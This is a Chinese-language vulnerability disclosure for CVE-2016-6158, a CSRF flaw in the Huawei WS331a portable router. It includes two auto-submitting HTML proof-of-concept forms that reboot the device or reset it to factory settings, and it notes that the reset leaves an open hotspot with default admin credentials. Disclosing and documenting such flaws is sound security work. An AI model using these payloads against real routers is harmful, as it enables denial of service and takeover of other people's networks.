### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|华为WS331a产品管理页面存在CSRF漏洞|2016-09-07|zixian（me@zixian.org）|[http://www.huawei.com/](http://www.huawei.com/) | [http://www.huawei.com/](http://www.huawei.com/) |WS331a-10 V100R001C02B017SP01及之前版本 | [CVE-2016-6158](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6158)|  

#### 漏洞概述  

> 华为WS331a 是一款便携无线路由器。
WS331a产品的管理页面中存在一个CSRF漏洞，未经过认证的攻击者可以利用此漏洞发起CSRF攻击。成功利用此漏洞，攻击者可以向受影响设备提交特定请求进而导致设备恢复出厂设置或者重启。 (漏洞编号:HWPSIRT-2016-07078)
此漏洞的CVE编号为：CVE-2016-6158。  


### POC实现代码如下：  

> 当管理员登陆后，打开如下poc页面，WS331a设备将重启。
``` html
<form action="http://192.168.3.1/api/service/reboot.cgi" method="post">
</form>
<script> document.forms[0].submit(); </script>
```
> 当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。   

```html
<form action="http://192.168.3.1/api/service/restoredefcfg.cgi" method="post">
</form>
<script> document.forms[0].submit(); </script>
```
